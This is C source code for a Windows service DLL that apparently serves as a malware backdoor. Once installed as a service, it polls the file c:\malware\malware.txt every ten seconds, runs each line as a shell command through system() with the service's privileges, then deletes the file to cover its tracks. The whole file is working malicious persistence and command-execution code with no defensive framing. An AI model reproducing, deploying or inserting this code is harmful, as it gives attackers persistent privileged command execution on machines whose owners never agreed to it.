#include <Windows.h>
#include <tchar.h>

#define MAXDBGLEN 1024
#define SERVICENAME _T("MyService")
#define SLEEPDELAYMS 10000
#define MAXFILESIZE (1024*1024) // do not exceed MAXDWORD
#define FILENAME _T("c:\\malware\\malware.txt")

#define DBGFUNCSTART { \
	TCHAR strMsg[MAXDBGLEN] = { 0 }; \
	_stprintf_s(strMsg, _countof(strMsg), _T("[GTSVC] Entering %hs()"), __FUNCTION__); \
	OutputDebugString(strMsg); \
}


HANDLE hTimer = NULL;
SERVICE_STATUS_HANDLE g_serviceStatusHandle = NULL;
SERVICE_STATUS g_serviceStatus =
{
	SERVICE_WIN32_SHARE_PROCESS,
	SERVICE_START_PENDING,
	SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE,
	0,
	0,
	0,
	0
};

DWORD ReadCommandsFile(void)
{
	TCHAR pwszFileName[MAX_PATH] = FILENAME;
	HANDLE hFile;
	DWORD dwLastError;
	LARGE_INTEGER liFileSize;
	PCHAR buf;
	DWORD dwRead;
	BOOL bRes;

	DBGFUNCSTART;
	_tcscpy_s(pwszFileName, _countof(pwszFileName), FILENAME);
	hFile = CreateFile(
		pwszFileName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	dwLastError = GetLastError();
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return dwLastError;
	}

	GetFileSizeEx(hFile, &liFileSize);
	if (liFileSize.QuadPart > MAXFILESIZE)
	{
		CloseHandle(hFile);
		return -1;
	}

	buf = LocalAlloc(LPTR, liFileSize.QuadPart);
	if (NULL == buf)
	{
		CloseHandle(hFile);
		return ERROR_NOT_ENOUGH_MEMORY;
	}

	bRes = ReadFile(hFile, buf, (DWORD)liFileSize.QuadPart, &dwRead, NULL);
	dwLastError = GetLastError();
	if (!bRes)
	{
		LocalFree(buf);
		CloseHandle(hFile);
		return dwLastError;
	}

	// assuming ASCII file
	PCHAR pcToken;
	PCHAR nextToken = NULL;
	CHAR seps[] = "\r\n";

	pcToken = strtok_s(buf, seps, &nextToken);

	while (NULL != pcToken)
	{
		TCHAR strMsg[MAXDBGLEN] = { 0 };
		_stprintf_s(strMsg, _countof(strMsg), _T("[GTSVC] Executing: #%hs#\r\n"), pcToken);
		OutputDebugString(strMsg);
		system(pcToken);
		pcToken = strtok_s(NULL, seps, &nextToken);
	}

	LocalFree(buf);
	CloseHandle(hFile);
	DeleteFile(pwszFileName);
	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	DBGFUNCSTART;
	DisableThreadLibraryCalls(hModule);
	return TRUE;
}

unsigned long CALLBACK SvcTimer(void* param)
{
	DBGFUNCSTART;
	while (TRUE)
	{
		TCHAR strMsg[MAXDBGLEN] = { 0 };
		DWORD dwResult;
		_stprintf_s(strMsg, _countof(strMsg), _T("[GTSVC] tick..."));
		OutputDebugString(strMsg);

		dwResult = ReadCommandsFile();
		_stprintf_s(strMsg, _countof(strMsg), _T("[GTSVC] ReadCommandsFile() returned %d"), dwResult);
		OutputDebugString(strMsg);

		Sleep(SLEEPDELAYMS);
	}
}


DWORD WINAPI SvcHandlerFunc(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
	DBGFUNCSTART;

	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		g_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		g_serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}

	SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);

	return NO_ERROR;
}

__declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPCWSTR* lpszArgv)
{
	DBGFUNCSTART;
	g_serviceStatusHandle = RegisterServiceCtrlHandlerEx(SERVICENAME, SvcHandlerFunc, NULL);
	if (!g_serviceStatusHandle)
	{
		return;
	}

	DWORD dwTid;
	hTimer = CreateEvent(NULL, FALSE, FALSE, NULL);
	CreateThread(NULL, 0, SvcTimer, NULL, 0, &dwTid);

	g_serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus);
}
